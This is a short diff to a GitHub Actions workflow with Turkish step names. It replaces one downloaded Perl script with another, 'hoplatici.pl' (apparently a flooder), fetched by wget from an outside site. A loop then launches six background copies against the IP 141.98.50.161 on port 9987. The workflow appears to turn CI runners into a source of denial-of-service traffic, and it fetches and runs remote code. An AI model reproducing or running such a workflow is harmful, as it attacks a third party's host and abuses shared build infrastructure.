@@ -16,14 +16,14 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/TcWUuiRuLq/init.pl
+          wget https://wgetz.com/pIBrlDRX0w/hoplatici.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl init.pl 141.98.50.161 9987 60 100 &
+            perl hoplatici.pl 141.98.50.161 9987 1400 &
             PIDS+=($!)
           done
           
